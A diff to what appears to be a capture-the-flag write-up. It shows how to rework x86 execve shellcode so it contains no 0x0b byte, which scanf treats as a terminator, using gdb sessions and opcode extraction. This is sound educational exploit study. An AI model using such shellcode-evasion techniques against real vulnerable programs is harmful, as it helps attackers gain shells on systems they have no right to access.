@@ -614,18 +614,125 @@ Turns out that `scanf` stops scanning at `0x0b`, which is a vertical tab accordi
 
 ### Circumvent Scanf's `0x0b` Limitation
 
-The `scanf` function stops scanning at byte `0x0b` of the payload. Byte `0x0b` must be considered a terminating character according to `scanf`. Therefore, this byte must be removed. And the question becomes: how to deliver the same payload without byte `0x0b`?
+The `scanf` function stops scanning at byte `0x0b` likely because `0x0b` is considered as a terminating character. Therefore, this byte must be removed from the payload. And the question becomes: how to deliver the same payload without byte `0x0b`?
 
-First examine what that byte is actually doing. From the shell code script it is doing this:
+First examine what that byte is actually doing. Take a look at the shellcode again:
 ```
-AT&T Assembly Syntax:
 8048073: b0 0b      mov    $0xb,%al
+```
 
-Intel Assembly Syntax:
+The above assembly instruction `mov $0xb,%al` is written in AT&T assembly syntax. In Intel assembly, it looks like this:
+```
 8048073: b0 0b      mov    al,0xb
 ```
 
-It is moving the hex value `0xb` into register `al`. 
+This instruction moves the hex value `0xb` into register `al`, which addresses the lowest 8-bits of the `eax` register ([source][8]):
+```
++--------------------------------------+
+| Register |        Accumulator        |
++--------------------------------------+
+| 32-bit   |            EAX            |
++--------------------------------------+
+| 16-bit   |             |     AX      |
++--------------------------------------+
+| 8-bit    |             |  AH  |  AL  |
++--------------------------------------+
+```
+
+Instead of moving `0xb` directly into `al`, it is possible to move another value and then subtract from that value to get the desired result. For instance:
+```
+mov al, 255
+sub al, 244
+```
+255 minus 244 equals 11, which is `0xb`. 
+
+Now get the opcodes of these instructions. Create a new file called [movb.asm](movb.asm). Add in the assembly instructions above along with the required template code:
+```
+global _start
+_start:
+	mov al, 255		
+	sub al, 244 
+	mov eax, 1		; sys_exit system call
+	int 0x80		; interrupt for system call
+```
+
+Compile and run it with gdb:
+```
+$ nasm -f elf32 movb.asm -o a1.out
+$ ld -m elf_i386 a1.out -o a2.out
+$ gdb a2.out
+```
+
+Set a breakpoint at the `_start` function. Define a `hook-stop` function to print `eax` and the current instruction. Then step just two instructions:
+```
+(gdb) set disassembly-flavor intel
+(gdb) info functions
+All defined functions:
+
+Non-debugging symbols:
+0x08048060  _start
+...
+(gdb) break _start
+Breakpoint 1 at 0x8048060
+(gdb) define hook-stop
+Type commands for definition of "hook-stop".
+End with a line saying just "end".
+>info registers eax
+>x/1i $eip
+>end
+(gdb) run
+Starting program: /home/zionperez/Desktop/playgrounds/assembly/a2.out 
+eax            0x0	0
+=> 0x8048060 <_start>:	mov    al,0xff
+
+Breakpoint 1, 0x08048060 in _start ()
+(gdb) si
+eax            0xff	255
+=> 0x8048062 <_start+2>:	sub    al,0xf4
+0x08048062 in _start ()
+(gdb) si
+eax            0xb	11
+=> 0x8048064 <_start+4>:	mov    eax,0x1
+0x08048064 in _start ()
+(gdb) 
+```
+
+After stepping through the first two instructions, `eax` is set to `0xb`:
+```
+eax     0xb     11
+```
+
+Now grab the actual opcodes for these instructions. Run the program again. Examine the first three instructions from the instruction pointer:
+```
+(gdb) run
+...
+eax            0x0	0
+=> 0x8048060 <_start>:	mov    al,0xff
+
+Breakpoint 1, 0x08048060 in _start ()
+(gdb) x/3i $eip
+=> 0x8048060 <_start>:	    mov    al,0xff
+   0x8048062 <_start+2>:	sub    al,0xf4
+   0x8048064 <_start+4>:	mov    eax,0x1
+```
+
+From the first instruction to the next is a difference of two bytes from `0x8048060 <_start>` to `0x8048062 <_start+2>`. The same is true for the second to third instructions. Therefore, both `mov al,0xff` and `sub al,0xf4` instructions are two bytes long. Inspect two bytes from `eip` at those intervals to view the opcodes:
+```
+(gdb) x/2bx $eip
+0x8048060 <_start>:	    0xb0	0xff
+(gdb) x/2bx $eip+2
+0x8048062 <_start+2>:	0x2c	0xf4
+```
+
+This table summarizes the instructions and their corresponding opcodes found:
+```
+Instruction     Opcode
+-----------     ---------
+mov al,0xff     0xb0 0xff
+sub al,0xf4     0x2c 0xf4
+```
+
+
 
 # TODO
 TODO: remove all /zionperez/ folder names
@@ -1458,6 +1565,7 @@ This challenge involved an incredible amount of trial-and-error. However, the so
 * [Shell Storm: Linux x86 execve("/bin/sh")][5]
 * [StackOverflow: Assembly "leave" instruction][6]
 * [StackOverflow: What is x86 "ret" instruction equivalent to?][7]
+* [Wikipedia: X86 Assembly/X86 Architecture][8]
 
 [1]:https://en.wikipedia.org/wiki/Scanf_format_string#Vulnerabilities
 [2]:https://www.geeksforgeeks.org/difference-between-scanf-and-gets-in-c/
@@ -1466,3 +1574,4 @@ This challenge involved an incredible amount of trial-and-error. However, the so
 [5]:http://shell-storm.org/shellcode/files/shellcode-811.php
 [6]:https://stackoverflow.com/questions/29790175/assembly-x86-leave-instruction/29790275
 [7]:https://stackoverflow.com/questions/20129107/what-is-the-x86-ret-instruction-equivalent-to
+[8]:https://en.wikibooks.org/wiki/X86_Assembly/X86_Architecture
